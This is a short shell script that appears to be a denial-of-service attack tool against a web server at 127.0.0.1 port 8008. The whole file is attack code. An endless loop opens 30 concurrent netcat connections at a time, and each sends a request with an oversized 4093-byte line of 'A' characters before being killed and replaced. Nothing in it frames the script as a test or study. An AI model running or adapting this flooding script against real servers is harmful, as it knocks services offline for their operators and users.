#!/bin/sh

SERVER=127.0.0.1
PORT=8008
WAIT=3

DUZOA=`perl -e '{print "A"x4093}'`
MAX=30

while :; do
  ILE=0
  while [ $ILE -lt $MAX ]; do
    (
      (
        echo "GET /"
        echo $DUZOA
        echo
      ) | nc $SERVER $PORT &
      sleep $WAIT
      kill -9 $!
    ) &>/dev/null &
    ILE=$[ILE+1]
  done
  sleep $WAIT
done

